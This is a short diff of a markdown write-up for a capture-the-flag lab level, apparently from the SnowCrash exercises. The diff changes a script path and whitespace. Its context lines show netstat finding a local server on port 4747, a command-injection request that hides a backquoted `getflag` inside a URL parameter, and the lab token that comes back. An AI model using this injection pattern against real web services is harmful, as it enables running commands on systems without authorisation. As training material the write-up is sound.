@@ -3,7 +3,7 @@
 ## Local script usage
 
 ```shell
-Usage: ./main.sh
+Usage: ./Ressources/main.sh
 ```
 
 ## Passwords and token
@@ -42,7 +42,7 @@ cat level04.pl
 netstat -tulpn | grep LISTEN
 # Which will confirm us that a server is actually running on the 4747 port
 >[...]
->tcp6       0      0 :::4747                 :::*                    LISTEN      - 
+>tcp6       0      0 :::4747                 :::*                    LISTEN      -
 >[...]
 ```
 
@@ -61,6 +61,7 @@ curl localhost:4747?x=42
 curl 'localhost:4747?x=`getflag`' #single quote used because of backquotes
 > Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
+
 ---
 
 ## Sources
